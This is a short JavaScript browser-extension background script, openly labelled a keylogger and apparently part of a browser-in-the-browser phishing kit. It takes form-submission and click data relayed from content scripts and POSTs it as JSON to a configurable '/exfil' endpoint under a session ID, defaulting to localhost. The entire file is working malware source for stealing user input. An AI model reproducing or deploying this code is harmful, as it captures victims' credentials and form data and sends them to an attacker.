// Keylogger background script

browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'formSubmit' || request.action === 'click') {
        sendData({event: request.action, data: request.data});
        sendResponse({status: 'sent'});
    }
    return true;
});

async function sendData(payload) {
    const endpoint = typeof BITB_CONFIG !== 'undefined' ? BITB_CONFIG.endpoint : 'http://localhost:8080';
    const sessionId = typeof BITB_CONFIG !== 'undefined' ? BITB_CONFIG.sessionId : 'unknown';
    try {
        await fetch(`${endpoint}/api/session/${sessionId}/exfil`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json', 'X-BitB-Source': 'keylogger'},
            body: JSON.stringify({sessionId, timestamp: new Date().toISOString(), keylog: [payload]})
        });
    } catch (e) {
        console.error('Keylogger send failed:', e);
    }
}
